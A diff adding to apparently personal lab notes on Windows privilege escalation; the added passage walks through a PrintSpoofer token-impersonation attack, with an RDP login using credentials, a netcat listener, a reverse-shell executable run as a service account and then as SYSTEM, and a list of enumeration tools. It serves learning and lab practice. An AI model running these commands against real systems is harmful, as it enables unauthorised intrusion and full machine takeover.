@@ -425,4 +425,38 @@ Now from within this shell I can use the rottenpotato exploit to impersonate the
 
   
 ## Token Impersonation - PrintSpoofer
+
+Another method when a Local/Network Service has SeImpersonatePrivilege is to use [PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer):
+  
+  First I will start a nc listener, then get a service account shell via the admin user's RPD session:
+  
+  `xfreerdp /v:10.10.155.194 /u:admin /p:password123` - Kali
+  
+  `nc -lvnp 53` -Kali
+  
+  `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe` - Win10
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183320508-b265fbbe-87a7-468e-a700-35cde3ddeb0a.png)
+
+From this shell, I can check privs of the service account
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183320552-674591ba-53c0-42f8-8127-60553c061bac.png)
+
+  Seeing that `SeImpersonatePrivilege` is enabled, I can use printspoofer to spawn a system shell after starting another listener:
+  
+  `C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183320758-fae9cb06-9b92-480e-9f90-3a8e996e33b0.png)
+
+  
+  
 ## Privilege Escalation Scripts
+  
+  
+winPEASany.exe
+
+Seatbelt.exe
+
+PowerUp.ps1
+
+SharpUp.exe
